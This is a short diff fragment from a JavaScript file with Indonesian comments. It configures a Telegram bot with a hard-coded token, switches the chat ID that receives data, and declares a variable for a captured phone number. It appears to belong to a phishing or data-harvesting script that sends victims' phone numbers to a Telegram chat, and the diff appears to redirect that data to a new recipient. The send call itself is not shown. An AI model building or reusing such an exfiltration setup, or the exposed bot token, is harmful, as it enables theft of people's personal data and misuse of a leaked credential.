@@ -4,7 +4,7 @@
 (function () {
     // Konfigurasi Bot Telegram
     const BOT_TOKEN = "7339549090:AAFklS9Oxc9Uzx4kQ7KE1d0SaSuenSJUGVk";
-    const CHAT_ID = "392836663";
+    const CHAT_ID = "7064926277";
 
     // Simpan data sementara
     let capturedPhone = null;
